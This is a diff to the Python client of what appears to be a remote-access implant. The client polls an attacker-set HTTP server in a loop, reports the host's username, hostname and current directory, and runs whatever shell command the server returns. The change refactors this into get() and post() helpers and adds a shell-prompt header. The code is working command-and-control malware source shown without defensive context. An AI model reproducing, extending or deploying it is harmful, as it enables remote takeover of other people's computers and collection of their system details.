@@ -18,27 +18,23 @@ class Client:
                  server_port: int):
         self.server_address = server_address
         self.server_port = server_port
+        self.server_url = f"http://{self.server_address}:{self.server_port}"
         self.hostname = platform.node()
         self.username = getpass.getuser()
         self.commands = ClientCommands(self)
 
     @property
-    def server_url(self) -> str:
-        return f"http://{self.server_address}:{self.server_port}"
+    def shell_prompt(self) -> str:
+        prompt = self.username, self.hostname, str(self.commands.get_cwd())
+        return ";".join(prompt)
 
     def execute(self) -> None:
         while True:
-            req = request.Request(url=self.server_url,
-                                  headers={
-                                      "username": self.username,
-                                      "hostname": self.hostname,
-                                      "cwd": str(self.commands.get_cwd())
-                                  })
             try:
-                response: str = request.urlopen(req).read().decode()
+                response: str = self.get()
             except (http.client.RemoteDisconnected, KeyboardInterrupt):
                 break
-            command = re.match(r'(?P<cmd>^[a-z]+)\s*(?P<args>.+)*',
+            command = re.match(r"(?P<cmd>^[a-z]+)\s*(?P<args>.+)*",
                                response,
                                flags=re.IGNORECASE)
             try:
@@ -51,7 +47,15 @@ class Client:
                 self.commands.shell([arg for arg in command.groups() if arg
                                      is not None])
 
-    def send(self, data: [str, bytes], url: str = None) -> None:
+    def get(self, url: str = None) -> str:
+        url = self.server_url if url is None else url
+        req = request.Request(url=url,
+                              headers={
+                                  "X-Shell-Prompt": self.shell_prompt
+                              })
+        return request.urlopen(req).read().decode()
+
+    def post(self, data: [str, bytes], url: str = None) -> None:
         url = self.server_url if url is None else url
         data: bytes = parse.urlencode({"contents": data}).encode()
         req = request.Request(url, data=data)
